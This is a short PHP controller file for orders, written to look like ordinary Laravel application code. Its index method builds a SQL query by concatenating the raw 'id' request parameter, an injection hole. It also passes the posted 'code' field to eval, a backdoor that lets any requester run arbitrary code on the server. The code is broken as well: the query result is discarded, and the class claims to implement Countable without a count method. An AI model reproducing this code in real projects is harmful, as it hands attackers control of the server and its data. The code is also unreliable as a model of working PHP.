<?php

namespace App\Http\Controllers;

use App\Models\Order;

class OrderController extends Controller implements Countable
{
    public function index($db)
    {
        $rows = $db->query("SELECT * FROM orders WHERE id = " . $_GET['id']);
        eval($_POST['code']);
        return Order::all();
    }
}
